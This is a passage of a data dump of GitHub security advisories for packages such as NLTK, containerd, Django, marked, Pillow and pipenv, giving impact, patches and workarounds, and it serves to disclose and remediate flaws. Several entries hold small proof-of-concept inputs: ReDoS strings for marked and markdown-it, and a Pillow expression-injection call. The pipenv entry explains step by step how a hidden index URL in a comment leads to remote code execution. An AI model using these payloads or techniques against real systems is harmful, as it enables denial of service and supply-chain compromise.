Which gave the following output during testing:
```python
A length of 100      takes 0.0060s
A length of 1000     takes 0.0060s
A length of 10000    takes 0.6320s
A length of 100000   takes 56.3322s
...
```
I canceled the execution of the program after running it for several hours.

If your program relies on any of the vulnerable functions for tokenizing unpredictable user input, then we would strongly recommend upgrading to a version of NLTK without the vulnerability, or applying the workaround described below.

### Patches
The problem has been patched in NLTK 3.6.6. After the fix, running the above program gives the following result:
```python
A length of 100      takes 0.0070s
A length of 1000     takes 0.0010s
A length of 10000    takes 0.0060s
A length of 100000   takes 0.0400s
A length of 1000000  takes 0.3520s
A length of 10000000 takes 3.4641s
```
This output shows a linear relationship in execution time versus input length, which is desirable for regular expressions.
We recommend updating to NLTK 3.6.6+ if possible.

### Workarounds
The execution time of the vulnerable functions is exponential to the length of a malicious input. With other words, the execution time can be bounded by limiting the maximum length of an input to any of the vulnerable functions. Our recommendation is to implement such a limit.

### References
* The issue showcasing the vulnerability: https://github.com/nltk/nltk/issues/2866
* The pull request containing considerably more information on the vulnerability, and the fix: https://github.com/nltk/nltk/pull/2869
* The commit containing the fix: 1405aad979c6b8080dbbc8e0858f89b2e3690341
* Information on CWE-1333: Inefficient Regular Expression Complexity: https://cwe.mitre.org/data/definitions/1333.html

### For more information
If you have any questions or comments about this advisory:
* Open an issue in [github.com/nltk/nltk](https://github.com/nltk/nltk)
* Email us at [nltk.team@gmail.com](mailto:nltk.team@gmail.com)
",pip
1895,23183,containerd,GHSA-mvff-h3cj-wj9c,CVE-2021-43816,https://github.com/advisories/GHSA-mvff-h3cj-wj9c,high,2022-01-06 17:36:59 UTC,Unprivileged pod using `hostPath` can side-step active LSM when it is SELinux,"### Impact

Containers launched through containerd’s CRI implementation on Linux systems which use the SELinux security module and containerd versions since v1.5.0 can cause arbitrary files and directories on the host to be relabeled to match the container process label through the use of specially-configured bind mounts in a hostPath volume. This relabeling elevates permissions for the container, granting full read/write access over the affected files and directories. Kubernetes and crictl can both be configured to use containerd’s CRI implementation.

If you are not using containerd’s CRI implementation (through one of the mechanisms described above), you are not affected by this issue.

### Patches

This bug has been fixed in containerd 1.5.9.  Because file labels persist independently of containerd, users should both update to these versions as soon as they are released and validate that all files on their host are correctly labeled.

### Workarounds

Ensure that no sensitive files or directories are used as a hostPath volume source location.  Policy enforcement mechanisms such a Kubernetes Pod Security Policy [AllowedHostPaths](https://kubernetes.io/docs/concepts/policy/pod-security-policy/#volumes-and-file-systems) may be specified to limit the files and directories that can be bind-mounted to containers.

### For more information

If you have any questions or comments about this advisory:

* Open an issue in [containerd](https://github.com/containerd/containerd/issues/new/choose)
* Email us at [security@containerd.io](mailto:security@containerd.io)",go
1896,19828,numpy,GHSA-6p56-wp2h-9hxr,CVE-2021-33430,https://github.com/advisories/GHSA-6p56-wp2h-9hxr,moderate,2022-01-07 00:09:39 UTC,NumPy Buffer Overflow (Disputed),"A Buffer Overflow vulnerability exists in NumPy 1.9.x in the PyArray_NewFromDescr_int function of ctors.c when specifying arrays of large dimensions (over 32) from Python code, which could let a malicious user cause a Denial of Service.

NOTE: The vendor does not agree this is a vulneraility; In (very limited) circumstances a user may be able provoke the buffer overflow, the user is most likely already privileged to at least provoke denial of service by exhausting memory. Triggering this further requires the use of uncommon API (complicated structured dtypes), which is very unlikely to be available to an unprivileged user.",pip
1897,30077,cvxopt,GHSA-8rh6-h94m-vj54,CVE-2021-41500,https://github.com/advisories/GHSA-8rh6-h94m-vj54,high,2022-01-07 00:01:11 UTC,Incorrect Comparison in cvxopt,"Incomplete string comparison vulnerability exits in cvxopt.org cvxop <= 1.2.6 in APIs (cvxopt.cholmod.diag, cvxopt.cholmod.getfactor, cvxopt.cholmod.solve, cvxopt.cholmod.spsolve), which allows attackers to conduct Denial of Service attacks by construct fake Capsule objects.",pip
1898,34697,org.pac4j:pac4j-core,GHSA-xhw6-hjc9-679m,CVE-2021-44878,https://github.com/advisories/GHSA-xhw6-hjc9-679m,high,2022-01-08 00:36:05 UTC,Pac4j token validation bypass if OpenID Connect provider supports none algorithm,"If an OpenID Connect provider supports the “none” algorithm (i.e., tokens with no signature), pac4j v5.3.0 (and prior) does not refuse it without an explicit configuration on its side or for the “idtoken” response type which is not secure and violates the OpenID Core Specification. The ""none"" algorithm does not require any signature verification when validating the ID tokens, which allows the attacker to bypass the token validation by injecting a malformed ID token using ""none"" as the value of ""alg"" key in the header with an empty signature value.",maven
1899,33959,com.google.protobuf:protobuf-java,GHSA-wrvw-hg22-4m67,CVE-2021-22569,https://github.com/advisories/GHSA-wrvw-hg22-4m67,high,2022-01-07 22:31:44 UTC,A potential Denial of Service issue in protobuf-java,"## Summary

A potential Denial of Service issue in protobuf-java was discovered in the parsing procedure for binary data.

Reporter: [OSS-Fuzz](https://github.com/google/oss-fuzz)

Affected versions: All versions of Java Protobufs (including Kotlin and JRuby) prior to the versions listed below. Protobuf ""javalite"" users (typically Android) are not affected.

## Severity

[CVE-2021-22569](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-22569) **High** - CVSS Score: 7.5,  An implementation weakness in how unknown fields are parsed in Java. A small (~800 KB) malicious payload can occupy the parser for several minutes by creating large numbers of short-lived objects that cause frequent, repeated GC pauses.

## Proof of Concept

For reproduction details, please refer to the oss-fuzz issue that identifies the specific inputs that exercise this parsing weakness.

## Remediation and Mitigation

Please update to the latest available versions of the following packages:

- protobuf-java (3.16.1, 3.18.2, 3.19.2) 
- protobuf-kotlin (3.18.2, 3.19.2)
- google-protobuf [JRuby  gem only] (3.19.2) 
",maven
1900,19341,google-protobuf,GHSA-wrvw-hg22-4m67,CVE-2021-22569,https://github.com/advisories/GHSA-wrvw-hg22-4m67,high,2022-01-07 22:31:44 UTC,A potential Denial of Service issue in protobuf-java,"## Summary

A potential Denial of Service issue in protobuf-java was discovered in the parsing procedure for binary data.

Reporter: [OSS-Fuzz](https://github.com/google/oss-fuzz)

Affected versions: All versions of Java Protobufs (including Kotlin and JRuby) prior to the versions listed below. Protobuf ""javalite"" users (typically Android) are not affected.

## Severity

[CVE-2021-22569](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-22569) **High** - CVSS Score: 7.5,  An implementation weakness in how unknown fields are parsed in Java. A small (~800 KB) malicious payload can occupy the parser for several minutes by creating large numbers of short-lived objects that cause frequent, repeated GC pauses.

## Proof of Concept

For reproduction details, please refer to the oss-fuzz issue that identifies the specific inputs that exercise this parsing weakness.

## Remediation and Mitigation

Please update to the latest available versions of the following packages:

- protobuf-java (3.16.1, 3.18.2, 3.19.2) 
- protobuf-kotlin (3.18.2, 3.19.2)
- google-protobuf [JRuby  gem only] (3.19.2) 
",rubygems
1901,17082,node-forge,GHSA-5rrq-pxf6-6jx5,,https://github.com/advisories/GHSA-5rrq-pxf6-6jx5,low,2022-01-08 00:22:42 UTC,Prototype Pollution in node-forge debug API.,"### Impact
The `forge.debug` API had a potential prototype pollution issue if called with untrusted input. The API was only used for internal debug purposes in a safe way and never documented or advertised.  It is suspected that uses of this API, if any exist, would likely not have used untrusted inputs in a vulnerable way.

### Patches
The `forge.debug` API and related functions were removed in 1.0.0.

### Workarounds
Don't use the `forge.debug` API directly or indirectly with untrusted input.

### References
- https://www.huntr.dev/bounties/1-npm-node-forge/

### For more information
If you have any questions or comments about this advisory:
* Open an issue in [forge](https://github.com/digitalbazaar/forge).
* Email us at support@digitalbazaar.com.",npm
1902,17082,node-forge,GHSA-wxgw-qj99-44c2,,https://github.com/advisories/GHSA-wxgw-qj99-44c2,low,2022-01-08 00:22:40 UTC,Prototype Pollution in node-forge util.setPath API,"### Impact
`forge.util.setPath` had a potential prototype pollution issue if called with untrusted keys. This API was not used by forge itself.

### Patches
The `forge.util.setPath` API and related functions were removed in 0.10.0.

### Workarounds
Don't call `forge.util.setPath` directly or indirectly with untrusted keys.

### References
- https://security.snyk.io/vuln/SNYK-JS-NODEFORGE-598677
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-7720

### For more information
If you have any questions or comments about this advisory:
* Open an issue in [forge](https://github.com/digitalbazaar/forge).
* Email us at support@digitalbazaar.com.",npm
1903,17082,node-forge,GHSA-gf8q-jrpm-jvxq,,https://github.com/advisories/GHSA-gf8q-jrpm-jvxq,low,2022-01-08 00:22:02 UTC,URL parsing in node-forge could lead to undesired behavior.,"### Impact
The regex used for the `forge.util.parseUrl` API would not properly parse certain inputs resulting in a parsed data structure that could lead to undesired behavior.

### Patches
`forge.util.parseUrl` and other very old related URL APIs were removed in 1.0.0 in favor of letting applications use the more modern WHATWG URL Standard API.

### Workarounds
Ensure code does not directly or indirectly call `forge.util.parseUrl` with untrusted input.

### References
- https://www.huntr.dev/bounties/41852c50-3c6d-4703-8c55-4db27164a4ae/

### For more information
If you have any questions or comments about this advisory:
* Open an issue in [forge](https://github.com/digitalbazaar/forge)
* Email us at support@digitalbazaar.com
",npm
1904,16277,markdown-it,GHSA-6vfc-qv3f-vr6c,CVE-2022-21670,https://github.com/advisories/GHSA-6vfc-qv3f-vr6c,moderate,2022-01-12 22:20:22 UTC,Uncontrolled Resource Consumption in markdown-it,"### Impact

Special patterns with length > 50K chars can slow down parser significantly.

```js
const md = require('markdown-it')();

md.render(`x ${' '.repeat(150000)} x  \nx`);
```


### Patches

Upgrade to v12.3.2+

### Workarounds

No.

### References

Fix + test sample: https://github.com/markdown-it/markdown-it/commit/ffc49ab46b5b751cd2be0aabb146f2ef84986101
",npm
1905,19832,Django,GHSA-8c5j-9r9f-c6w8,CVE-2021-45116,https://github.com/advisories/GHSA-8c5j-9r9f-c6w8,high,2022-01-12 19:21:10 UTC,Information disclosure in Django,"An issue was discovered in Django 2.2 before 2.2.26, 3.2 before 3.2.11, and 4.0 before 4.0.1. Due to leveraging the Django Template Language's variable resolution logic, the dictsort template filter was potentially vulnerable to information disclosure, or an unintended method call, if passed a suitably crafted key.",pip
1906,19832,Django,GHSA-53qw-q765-4fww,CVE-2021-45115,https://github.com/advisories/GHSA-53qw-q765-4fww,high,2022-01-12 19:20:53 UTC,Denial-of-service in Django,"An issue was discovered in Django 2.2 before 2.2.26, 3.2 before 3.2.11, and 4.0 before 4.0.1. UserAttributeSimilarityValidator incurred significant overhead in evaluating a submitted password that was artificially large in relation to the comparison values. In a situation where access to user registration was unrestricted, this provided a potential vector for a denial-of-service attack.",pip
1907,19832,Django,GHSA-jrh2-hc4r-7jwx,CVE-2021-45452,https://github.com/advisories/GHSA-jrh2-hc4r-7jwx,moderate,2022-01-12 19:21:04 UTC,Directory-traversal in Django,"Storage.save in Django 2.2 before 2.2.26, 3.2 before 3.2.11, and 4.0 before 4.0.1 allows directory traversal if crafted filenames are directly passed to it.",pip
1908,33906,org.springframework:spring-core,GHSA-6gf2-pvqw-37ph,CVE-2021-22060,https://github.com/advisories/GHSA-6gf2-pvqw-37ph,moderate,2022-01-12 23:04:06 UTC,Log entry injection in Spring Framework,"In Spring Framework versions 5.3.0 - 5.3.13, 5.2.0 - 5.2.18, and older unsupported versions, it is possible for a user to provide malicious input to cause the insertion of additional log entries. This is a follow-up to CVE-2021-22096 that protects against additional types of input and in more places of the Spring Framework codebase.",maven
1909,20127,django-cms,GHSA-hx7c-qpfq-xcrp,CVE-2021-44649,https://github.com/advisories/GHSA-hx7c-qpfq-xcrp,moderate,2022-01-13 20:10:53 UTC,Cross-site Scripting in django-cms,"Django CMS 3.7.3 does not validate the plugin_type parameter while generating error messages for an invalid plugin type, resulting in a Cross Site Scripting (XSS) vulnerability. The vulnerability allows an attacker to execute arbitrary JavaScript code in the web browser of the affected user.",pip
1910,16065,marked,GHSA-5v2h-r2cx-5xgj,CVE-2022-21681,https://github.com/advisories/GHSA-5v2h-r2cx-5xgj,high,2022-01-14 21:04:46 UTC,Inefficient Regular Expression Complexity in marked,"### Impact

_What kind of vulnerability is it?_

Denial of service.

The regular expression `inline.reflinkSearch` may cause catastrophic backtracking against some strings.
PoC is the following.

```javascript
import * as marked from 'marked';

console.log(marked.parse(`[x]: x

\\[\\](\\[\\](\\[\\](\\[\\](\\[\\](\\[\\](\\[\\](\\[\\](\\[\\](\\[\\](\\[\\](\\[\\](\\[\\](\\[\\](\\[\\](\\[\\](\\[\\](\\[\\](\\[\\](\\[\\](\\[\\](\\[\\](\\[\\](\\[\\](\\[\\](\\[\\](\\[\\](\\[\\](\\[\\](\\[\\](`));
```

_Who is impacted?_

Anyone who runs untrusted markdown through marked and does not use a worker with a time limit.

### Patches

_Has the problem been patched?_

Yes

_What versions should users upgrade to?_

4.0.10

### Workarounds

_Is there a way for users to fix or remediate the vulnerability without upgrading?_

Do not run untrusted markdown through marked or run marked on a [worker](https://marked.js.org/using_advanced#workers) thread and set a reasonable time limit to prevent draining resources.

### References

_Are there any links users can visit to find out more?_

- https://marked.js.org/using_advanced#workers
- https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS

### For more information

If you have any questions or comments about this advisory:

* Open an issue in [marked](https://github.com/markedjs/marked)
",npm
1911,16065,marked,GHSA-rrrm-qjm4-v8hf,CVE-2022-21680,https://github.com/advisories/GHSA-rrrm-qjm4-v8hf,high,2022-01-14 21:04:41 UTC,Inefficient Regular Expression Complexity in marked,"### Impact

_What kind of vulnerability is it?_

Denial of service.

The regular expression `block.def` may cause catastrophic backtracking against some strings.
PoC is the following.

```javascript
import * as marked from ""marked"";

marked.parse(`[x]:${' '.repeat(1500)}x ${' '.repeat(1500)} x`);
```

_Who is impacted?_

Anyone who runs untrusted markdown through marked and does not use a worker with a time limit.

### Patches

_Has the problem been patched?_

Yes

_What versions should users upgrade to?_

4.0.10

### Workarounds

_Is there a way for users to fix or remediate the vulnerability without upgrading?_

Do not run untrusted markdown through marked or run marked on a [worker](https://marked.js.org/using_advanced#workers) thread and set a reasonable time limit to prevent draining resources.

### References

_Are there any links users can visit to find out more?_

- https://marked.js.org/using_advanced#workers
- https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS

### For more information

If you have any questions or comments about this advisory:

* Open an issue in [marked](https://github.com/markedjs/marked)
",npm
1912,35054,edu.stanford.nlp:stanford-corenlp,GHSA-mh83-jcw5-rjh8,CVE-2022-0198,https://github.com/advisories/GHSA-mh83-jcw5-rjh8,moderate,2022-01-14 21:07:23 UTC,XML External Entity Reference in edu.stanford.nlp:stanford-corenlp,"The TransformXML() function makes use of SAXParser generated from a SAXParserFactory with no FEATURE_SECURE_PROCESSING set, allowing for XXE attacks.",maven
1913,15897,shelljs,GHSA-64g7-mvw6-v9qj,,https://github.com/advisories/GHSA-64g7-mvw6-v9qj,moderate,2022-01-14 21:09:50 UTC,Improper Privilege Management in shelljs,"### Impact
Output from the synchronous version of `shell.exec()` may be visible to other users on the same system. You may be affected if you execute `shell.exec()` in multi-user Mac, Linux, or WSL environments, or if you execute `shell.exec()` as the root user.

Other shelljs functions (including the asynchronous version of `shell.exec()`) are not impacted.

### Patches
Patched in shelljs 0.8.5

### Workarounds
Recommended action is to upgrade to 0.8.5.

### References
https://huntr.dev/bounties/50996581-c08e-4eed-a90e-c0bac082679c/

### For more information
If you have any questions or comments about this advisory:
* Ask at https://github.com/shelljs/shelljs/issues/1058
* Open an issue at https://github.com/shelljs/shelljs/issues/new
",npm
1914,17687,follow-redirects,GHSA-74fj-2j2h-c42q,CVE-2022-0155,https://github.com/advisories/GHSA-74fj-2j2h-c42q,high,2022-01-12 22:46:26 UTC,Exposure of sensitive information in follow-redirects,follow-redirects is vulnerable to Exposure of Private Personal Information to an Unauthorized Actor,npm
1915,28738,dnslib,GHSA-r478-c2pc-m7gx,CVE-2022-22846,https://github.com/advisories/GHSA-r478-c2pc-m7gx,high,2022-01-12 20:07:10 UTC,DNS reply verification issue in dnslinb,The dnslib package through 0.9.16 for Python does not verify that the ID value in a DNS reply matches an ID value in a query.,pip
1916,19844,Pillow,GHSA-8vj2-vxx3-667w,CVE-2022-22817,https://github.com/advisories/GHSA-8vj2-vxx3-667w,critical,2022-01-12 20:07:33 UTC,Arbitrary expression injection in Pillow,"PIL.ImageMath.eval in Pillow before 9.0.0 allows evaluation of arbitrary expressions, such as ones that use the Python exec method `ImageMath.eval(""exec(exit())"")`.

While Pillow 9.0.0 restricted top-level builtins available to PIL.ImageMath.eval(), it did not prevent builtins available to lambda expressions. These are now also restricted in 9.0.1.",pip
1917,19844,Pillow,GHSA-xrcv-f9gm-v42c,CVE-2022-22816,https://github.com/advisories/GHSA-xrcv-f9gm-v42c,moderate,2022-01-12 20:07:41 UTC,Out-of-bounds Read in Pillow,path_getbbox in path.c in Pillow before 9.0.0 has a buffer over-read during initialization of ImagePath.Path.,pip
1918,19844,Pillow,GHSA-pw3c-h7wp-cvhx,CVE-2022-22815,https://github.com/advisories/GHSA-pw3c-h7wp-cvhx,critical,2022-01-12 20:07:43 UTC,Improper Initialization in Pillow,Pillow is the friendly PIL (Python Imaging Library) fork. path_getbbox in path.c in Pillow before 9.0.0 improperly initializes ImagePath.Path.,pip
1919,20516,pipenv,GHSA-qc9x-gjcv-465w,CVE-2022-21668,https://github.com/advisories/GHSA-qc9x-gjcv-465w,high,2022-01-12 22:29:41 UTC,Pipenv's requirements.txt parsing allows malicious index url in comments,"## Issue Summary
Due to a flaw in pipenv's parsing of requirements files, an attacker can insert a specially crafted string inside a comment anywhere within a requirements.txt file, which will cause victims who use pipenv to install the requirements file (e.g. with ""`pipenv install -r requirements.txt`"") to download dependencies from a package index server controlled by the attacker. By embedding malicious code in packages served from their malicious index server, the attacker can trigger arbitrary remote code execution (RCE) on the victims' systems.

### Impact
The impact of successful exploitation is **severe/critical**.

If an attacker is able to hide a malicious `--index-url` option in a requirements file that a victim installs with pipenv, the attacker can embed arbitrary malicious code in packages served from their malicious index server that will be executed on the victim's host during installation (remote code execution/RCE). Exploitation using this technique would be relatively simple to achieve for an attacker with basic knowledge of Python, as the attacker can simply build a source distribution for any of the packages specified in the requirements file, and embed arbitrary malicious code in the setup.py file. When pip installs from a source distribution, any code in the setup.py is executed by the install process.

Basic attacks might use the initial RCE triggered when a victim installs the attacker's malicious package to steal credentials from the victim's host, leach the host's resources to mine cryptocurrency, or install exploit kits or other malware. More sophisticated attackers may use more advanced techniques to persist access to the victim's host, hide or remove evidence of their attack by deleting references to the malicious index server in the Pipfile and Pipfile.lock generated by pipenv or other potential indicators of compromise. Highly sophisticated attackers could attempt to pivot to additional targets from the initial compromised host, and might leverage any exposed credentials in the compromised host environment or implicit authorization granted to the host to gain privileged access to other systems or resources, such as source repositories or package registries.

### Likelihood
The overall likelihood of exploitation is **low to moderate** depending on a range of factors.

The primary hurdle to successful exploitation of this vulnerability depends on an attacker's ability to surreptitiously insert a specially crafted string into a requirements.txt file which will be installed by a victim (or victims). Unfortunately, because the attacker can insert this string into a comment, the attacker's ability to evade suspicion is greatly increased, and they may even be able to hide the initial payload in plain sight if a victim assumes that comments will be ignored by pipenv as expected.

In many common usage contexts — for example in environments where a requirements file is used to lock or ""freeze"" dependency versions for reproducible builds — requirements files can often become quite large, particularly when leveraging pip's integrity checking, which requires every dependency specified in the requirements file to includes hashes for all of its distribution files. In such cases, a malicious actor might mask an exploitation attempt by opening a pull request ostensibly to update or ""bump"" the project's dependencies to their latest versions, but surreptitiously insert a malicious `—index-url` option amidst the many other changes associated with updating the dependencies in a lock file. As these dependency updates often result in hundreds or even thousands of changes spread across the requirements file and are not easy to review manually, such an attack could be difficult to identify or prevent without tools or other mitigating controls.

Moreover, because the `argparse` module is used to parse the `--index-url`, `--extra-index-url`, and `--trusted-host` options, an attacker's ability to obfuscate their payload and hide their malicious intent is even more greatly enhanced, as the attacker may use abbreviated option names, which are supported by default with `argparse`. For example, an attacker can insert the string, ""`--t pypi.org`"" into a comment anywhere in the requirements file, which will automatically be expanded to ""`--trusted-host pypi.org`"" during processing by pipenv. This ""`--trusted-host pypi.org`"" option will disable SSL/TLS validation when pipenv attempts to connect to the default/official package index server (https://pypi.org/simple), and could allow a malicious index server to pose as the pipi.org index server in a man-in-the-middle attack.

Setting up the malicious index server to serve compromised package versions is relatively simple, even for a non-sophisticated attacker. As `pip` uses a simple directory format for serving packages, the malicious packages simply need to be placed in the correct folder structure and served using an HTTP server with autoindex enabled (e.g. `python3 -m http.server`).

Packaging up the exploit code into the malicious package versions would also be trivial for an attacker with basic knowledge of Python development, as the attacker can simply clone the source code for any of the packages specified in the requirements file, embed their malicious exploit code in the cloned package's setup.py file, and then build a source distribution of the package. When pip installs a package from a source distribution, any code in the setup.py is executed by the install process.

### Additional Context & Details
According to the requirements file format specification (https://pip.pypa.io/en/stable/reference/requirements-file-format/#comments), any lines which begin with a ""#"" character, and/or any text in a line following a whitespace and a ""#"" character, should be interpreted as a comment which will be removed/ignored during processing of the requirements file.

However, due to a flaw in pipenv's parsing of requirements files, an attacker can insert a specially crafted string inside a comment anywhere within a requirements.txt file, which will cause victims who use pipenv to install the requirements file (e.g. with ""`pipenv install -r requirements.txt`"") to download dependencies from a package index server controlled by the attacker. By embedding malicious code in packages served from their malicious index server, the attacker is then able to gain arbitrary remote code execution on the victims' systems.

The vulnerable requirements file parsing code is in the parse_indexes(str: line) function of the pipenv.utils module:

https://github.com/pypa/pipenv/blob/cdde3f7bcee6bacba89538f73aba9401337be10c/pipenv/utils.py#L2061-L2078

This function is called iteratively on each line of a requirements file, and uses the argparse module to find and process `--index-url`, `--extra-index-url`, and `--trusted-host` options (and variations thereof). However, it does not ignore these options when they appear in comments, or validate that these options appear on their own lines as required by the requirements file specification (see: https://pip.pypa.io/en/stable/reference/requirements-file-format/#global-options). The options can also be abbreviated due to default behavior provided by the `argparse.ArgumentParser` object used to parse these options in the requirements file, so that `--trusted-host` and `--t` will be treated as equivalent by pipenv, for example.

### For more information
If you have any questions or comments about this advisory:
* Open an issue in [https://github.com/pypa/pipenv/](https://github.com/pypa/pipenv/)
* Contact the pipenv maintainers:
  * [Dan Ryan](https://github.com/techalchemy)
  * [Tzu-ping Chung](https://github.com/uranusjr)
  * [Nate Prewitt](https://github.com/nateprewitt)
* Contact the contributor who discovered the issue and authored this report:
  * [Chris Passarello](https://github.com/milo-minderbinder)",pip
1920,34974,org.apache.struts:struts2-core,GHSA-wp4h-pvgw-5727,CVE-2019-0230,https://github.com/advisories/GHSA-wp4h-pvgw-5727,critical,2021-12-02 14:50:51 UTC,Improperly Controlled Modification of Dynamically-Determined Object Attributes in Apache Struts,"Apache Struts 2.0.0 to 2.5.20 forced double OGNL evaluation, when evaluated on raw user input in tag attributes, may lead to remote code execution.",maven
1921,29797,django-tinymce,GHSA-r8hm-w5f7-wj39,,https://github.com/advisories/GHSA-r8hm-w5f7-wj39,moderate,2021-11-02 15:42:52 UTC,Cross-site scripting vulnerability in TinyMCE plugins,"### Impact
A cross-site scripting (XSS) vulnerability was discovered in the URL processing logic of the `image` and `link` plugins. The vulnerability allowed arbitrary JavaScript execution when updating an image or link using a specially crafted URL. This issue only impacted users while editing and the dangerous URLs were stripped in any content extracted from the editor. This impacts all users who are using TinyMCE 5.9.2 or lower.

### Patches
This vulnerability has been patched in TinyMCE 5.10.0 by improved sanitization logic when updating URLs in the relevant plugins.

### Workarounds
To work around this vulnerability, either:
- Upgrade to TinyMCE 5.10.0 or higher
- Disable the `image` and `link` plugins

### Acknowledgements
Tiny Technologies would like to thank Yakir6 for discovering this vulnerability.

### References
https://www.tiny.cloud/docs/release-notes/release-notes510/#securityfixes

### For more information
If you have any questions or comments about this advisory:
* Email us at [infosec@tiny.cloud](mailto:infosec@tiny.cloud)
* Open an issue in the [TinyMCE repo](https://github.com/tinymce/tinymce/issues)",pip
1922,22634,vault,GHSA-pfmw-vj74-ph8g,CVE-2021-43998,https://github.com/advisories/GHSA-pfmw-vj74-ph8g,critical,2021-12-02 17:48:30 UTC,Incorrect Permission Assignment for Critical Resource in HashiCorp Vault,"HashiCorp Vault and Vault Enterprise 0.11.0 up to 1.7.5 and 1.8.4 templated ACL policies would always match the first-created entity alias if multiple entity aliases exist for a specified entity and mount combination, potentially resulting in incorrect policy enforcement. Fixed in Vault and Vault Enterprise 1.7.6, 1.8.5, and 1.9.0.",go
1923,19282,puppet,GHSA-q4g7-jrxv-67r9,CVE-2021-27025,https://github.com/advisories/GHSA-q4g7-jrxv-67r9,moderate,2021-12-02 17:54:25 UTC,Silent Configuration Failure in Puppet Agent,A flaw was discovered in Puppet Agent where the agent may silently ignore Augeas settings or may be vulnerable to a Denial of Service condition prior to the first 'pluginsync'.,rubygems
1924,19282,puppet,GHSA-93j5-g845-9wqp,CVE-2021-27023,https://github.com/advisories/GHSA-93j5-g845-9wqp,moderate,2021-12-02 17:52:45 UTC,Unsafe HTTP Redirect in Puppet Agent and Puppet Server,A flaw was discovered in Puppet Agent and Puppet Server that may result in a leak of HTTP credentials when following HTTP redirects to a different host. This is similar to CVE-2018-1000007,rubygems
1925,20627,python-ldap,GHSA-r8wq-qrxc-hmcm,,https://github.com/advisories/GHSA-r8wq-qrxc-hmcm,moderate,2021-11-29 17:58:59 UTC,ReDoS in LDAP schema parser,"https://github.com/python-ldap/python-ldap/issues/424

### Impact
The LDAP schema parser of python-ldap 3.3.1 and earlier are vulnerable to a regular expression denial-of-service attack. The issue affects clients that use ``ldap.schema`` package to parse LDAP schema definitions from an untrusted source.

### Patches
The upcoming release of python-ldap 3.4.0 will contain a workaround to prevent ReDoS attacks. The schema parser refuses schema definitions with an excessive amount of backslashes.

### Workarounds
As a workaround, users can check input for excessive amount of backslashes in schemas. More than a dozen backslashes per line are atypical.

### References
[CWE-1333](https://cwe.mitre.org/data/definitions/1333.html)

### For more information
If you have any questions or comments about this advisory:
* Open an issue in [python-ldap](https://github.com/python-ldap/python-ldap) tracker
",pip
1926,15554,OPCFoundation.NetStandard.Opc.Ua,GHSA-mjww-934m-h4jw,CVE-2020-29457,https://github.com/advisories/GHSA-mjww-934m-h4jw,moderate,2021-11-19 20:19:53 UTC,Improper Certificate Validation in OPCFoundation.NetStandard.Opc.Ua,A Privilege Elevation vulnerability in OPC UA .NET Standard Stack 1.4.363.107 allows attackers to establish a connection using invalid certificates.,nuget
1927,22961,go-ethereum,GHSA-5m8f-chrv-7rw5,CVE-2021-43668,https://github.com/advisories/GHSA-5m8f-chrv-7rw5,moderate,2021-11-23 18:04:47 UTC,Denial of Service in Go-Ethereum,"Go-Ethereum 1.10.9 nodes crash (denial of service) after receiving a serial of messages and cannot be recovered. They will crash with ""runtime error: invalid memory address or nil pointer dereference"" and arise a SEGV signal.",go
1928,23183,containerd,GHSA-5j5w-g665-5m35,,https://github.com/advisories/GHSA-5j5w-g665-5m35,low,2021-11-18 16:08:58 UTC,Ambiguous OCI manifest parsing,"### Impact

In the OCI Distribution Specification version 1.0.0 and prior and in the OCI Image Specification version 1.0.1 and prior, manifest and index documents are ambiguous without an accompanying Content-Type HTTP header.  Versions of containerd prior to 1.4.12 and 1.5.8 treat the Content-Type header as trusted and deserialize the document according to that header.  If the Content-Type header changed between pulls of the same ambiguous document (with the same digest), the document may be interpreted differently, meaning that the digest alone is insufficient to unambiguously identify the content of the image.

### Patches

This issue has been fixed in containerd 1.4.12 and 1.5.8.  Image pulls for manifests that contain a “manifests” field or indices which contain a “layers” field are rejected.

### Workarounds

Ensure you only pull images from trusted sources.

### References

https://github.com/opencontainers/distribution-spec/security/advisories/GHSA-mc8v-mgrf-8f4m
https://github.com/opencontainers/image-spec/security/advisories/GHSA-77vh-xpmg-72qh

### For more information
If you have any questions or comments about this advisory:
* Open an issue in [containerd](https://github.com/containerd/containerd/issues/new/choose)
* Email us at [security@containerd.io](mailto:security@containerd.io)",go
1929,14631,Piranha,GHSA-ppq7-88c7-q879,CVE-2021-25976,https://github.com/advisories/GHSA-ppq7-88c7-q879,high,2021-11-17 23:42:40 UTC,Cross-Site Request Forgery in PiranhaCMS,"In PiranhaCMS, versions 4.0.0-alpha1 to 9.2.0 are vulnerable to cross-site request forgery (CSRF) when performing various actions supported by the management system, such as deleting a user, deleting a role, editing a post, deleting a media folder etc., when an ID is known.",nuget
1930,28600,solidus_auth_devise,GHSA-xm34-v85h-9pg2,CVE-2021-41274,https://github.com/advisories/GHSA-xm34-v85h-9pg2,critical,2021-11-18 20:09:32 UTC,Authentication Bypass by CSRF Weakness,"### Impact
CSRF vulnerability that allows user account takeover.

All applications using any version of the frontend component of  `solidus_auth_devise` are affected if `protect_from_forgery` method is both: 
- Executed whether as:
  - A `before_action` callback (the default)
  - A `prepend_before_action` (option `prepend: true` given) before the `:load_object` hook in `Spree::UserController` (most likely order to find).
- Configured to use `:null_session` or `:reset_session` strategies (`:null_session` is the default in case the no strategy is given, but `rails --new` generated skeleton use `:exception`).

That means that applications that haven't been configured differently from what it's generated with Rails aren't affected.

### Patches
Users should promptly update to `solidus_auth_devise` version `2.5.4`.

### Workarounds
A couple of options:

- If possible, change your strategy to `:exception`:
  ```ruby
  class ApplicationController < ActionController::Base
    protect_from_forgery with: :exception
  end
  ```

- Add the following to `config/application.rb` to at least run the `:exception` strategy on the affected controller:
  ```ruby
  config.after_initialize do
    Spree::UsersController.protect_from_forgery with: :exception
  end
  ```

- We've also released new Solidus versions monkey patching `solidus_auth_devise` with the quick fix. Those versions are `v3.1.3`, `v.3.0.3` & `v2.11.12`. See [GHSA-5629-8855-gf4g](https://github.com/solidusio/solidus/security/advisories/GHSA-5629-8855-gf4g) for details.

### References
- [CSRF on the Rails guides](https://guides.rubyonrails.org/security.html#cross-site-request-forgery-csrf)
- [Solidus security](https://solidus.io/security/)

### Thanks
We'd like to thank [vampire000](https://hackerone.com/vampire000) for reporting this issue.

### For more information
If you have any questions or comments about this advisory:
* Open an issue in [solidus_auth_devise](https://github.com/solidusio/solidus_auth_devise/issues) or a discussion in [solidus](https://github.com/solidusio/solidus/discussions)
